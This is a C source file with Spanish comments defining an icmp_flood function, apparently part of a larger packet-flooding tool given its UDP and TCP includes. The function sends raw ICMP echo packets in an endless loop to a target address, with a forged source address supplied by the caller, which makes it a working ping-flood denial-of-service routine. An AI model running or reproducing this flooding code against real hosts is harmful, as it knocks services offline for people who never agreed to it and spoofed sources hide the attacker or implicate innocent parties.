#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "./includes/helpers.h"
#include "./includes/udp.h"
#include "./includes/tcp.h"
#include "./includes/icmp.h"

// Funcion que un paquete ICMP ECHO
void icmp_flood(int sock, char* src, char* dst){
    while(1){
        // direccion IP de destino
        struct sockaddr_in daddr;
        if(host_addr(&daddr, dst, 0) == 1){
            perror("Error al crear la configuracion IP");
            exit(1);
        }

        // direccion IP de origen
        struct sockaddr_in saddr;
        if(host_addr(&saddr, src, (rand() % 65535)) == 1){
            perror("Error al crear la configuracion IP");
            exit(1);
        }

        char *datagram = calloc(DATAGRAM_LEN, sizeof(char));

        struct icmphdr *icmph = (struct icmphdr *) (datagram + sizeof(struct iphdr));

        icmph->type = ICMP_ECHO;         // ICMP tipo echo
        icmph->code = 0;                 // ICMP codigo
        icmph->un.echo.id = htons(1234); // Identificador
        icmph->un.echo.sequence = htons(1); // Numero de secuencia
        icmph->checksum = 0;
        icmph->checksum = csum((unsigned short*)icmph, sizeof(struct icmphdr));

        // header IP
        struct iphdr *iph = (struct iphdr *) datagram;
        
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
        iph->id = htonl(rand() % 78123);
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = IPPROTO_ICMP;
        iph->check = 0;
        iph->saddr = saddr.sin_addr.s_addr;
        iph->daddr = daddr.sin_addr.s_addr;
        
        // Checksum IP
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        if(sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
        {
            perror("No se ha podido enviar el paquete ICMP");
            exit(1);
        } else {
            printf ("Paquete ICMP enviado a %s. Tamaño : %d \n", dst, iph->tot_len);
        }
    }
}